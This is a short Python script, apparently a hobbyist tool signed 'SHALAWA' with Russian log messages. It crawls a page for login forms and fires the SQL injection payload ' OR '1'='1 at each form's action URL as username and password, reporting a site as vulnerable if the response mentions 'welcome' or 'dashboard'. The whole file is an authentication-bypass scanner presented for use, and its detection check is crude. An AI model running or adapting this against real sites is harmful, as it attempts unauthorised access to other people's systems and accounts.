import requests
from bs4 import BeautifulSoup
import logging

# Настройка логирования
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def find_login_forms(url):
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        login_forms = []
        for form in forms:
            if 'login' in str(form).lower() or 'sign' in str(form).lower():
                action = form.get('action')
                if action:
                    login_forms.append(action)
        return login_forms
    except Exception as e:
        logger.error(f"Ошибка при поиске форм входа на {url}: {e}")
        return []

def check_sql_injection(url):
    payload = "' OR '1'='1"
    test_url = f"{url}?username={payload}&password={payload}"
    try:
        response = requests.get(test_url)
        if "welcome" in response.text.lower() or "dashboard" in response.text.lower():
            logger.info(f"Возможная уязвимость SQL-инъекции на {url}")
            return True
        else:
            logger.info(f"Уязвимость SQL-инъекции не обнаружена на {url}")
            return False
    except Exception as e:
        logger.error(f"Ошибка при проверке SQL-инъекции на {url}: {e}")
        return False

if __name__ == "__main__":
    target_url = "http://example.com/login"
    login_forms = find_login_forms(target_url)
    for form_action in login_forms:
        full_url = f"http://example.com{form_action}"
        vulnerable = check_sql_injection(full_url)
        print(f"URL: {full_url} | SQL Injection Vulnerable: {vulnerable}")



#CREATED BY SHALAWA!
